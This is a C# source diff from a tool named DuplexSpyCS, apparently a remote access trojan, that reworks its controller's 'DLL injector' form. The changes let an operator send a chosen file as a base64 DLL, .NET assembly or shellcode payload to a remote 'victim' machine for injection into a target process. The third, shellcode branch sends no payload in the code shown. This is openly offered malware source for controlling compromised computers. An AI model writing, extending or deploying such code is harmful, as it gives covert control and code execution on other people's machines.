@@ -12,15 +12,24 @@ namespace DuplexSpyCS
 {
     public partial class frmTaskDLLInjector : Form
     {
-        public clsVictim v;
-        private int m_nProcId;
+        public clsVictim m_victim { get; set; }
+        private int m_nProcId { get; set; }
 
-        public frmTaskDLLInjector(clsVictim v, int nProcId)
+        public frmTaskDLLInjector(clsVictim victim, int nProcId)
         {
             InitializeComponent();
 
-            this.v = v;
+            m_victim = victim;
             m_nProcId = nProcId;
+
+            Text = $"Injector | {victim.ID}";
+        }
+
+        public enum enMethod
+        {
+            Native,
+            DotNet,
+            ShellCode,
         }
 
         private void fnSetup()
@@ -48,11 +57,45 @@ namespace DuplexSpyCS
         {
             try
             {
+                int nIdx = tabControl1.SelectedIndex;
+
                 string szFileName = textBox1.Text;
                 int nProcId = int.Parse(textBox2.Text);
+                List<string> lsArgs = textBox3.Text.Split(' ').ToList();
 
                 byte[] abBuffer = File.ReadAllBytes(szFileName);
-                Task.Run(() => v.SendCommand($"dll|{0}|{Convert.ToBase64String(abBuffer)}|{nProcId}"));
+                Task.Run(() =>
+                {
+                    switch (nIdx)
+                    {
+                        case 0:
+                            m_victim.fnSendCommand(new string[]
+                            {
+                                "injector",
+                                nIdx.ToString(),
+                                Convert.ToBase64String(abBuffer),
+                                nProcId.ToString(),
+                            });
+                            break;
+                        case 1:
+                            m_victim.fnSendCommand(new string[]
+                            {
+                                "injector",
+                                nIdx.ToString(),
+                                Convert.ToBase64String(abBuffer),
+                                string.Join(",", lsArgs.Select(x => clsCrypto.b64E2Str(x))),
+                            });
+                            break;
+                        case 2:
+                            m_victim.fnSendCommand(new string[]
+                            {
+                                "injector",
+                                nIdx.ToString(),
+
+                            });
+                            break;
+                    }
+                });
             }
             catch (Exception ex)
             {
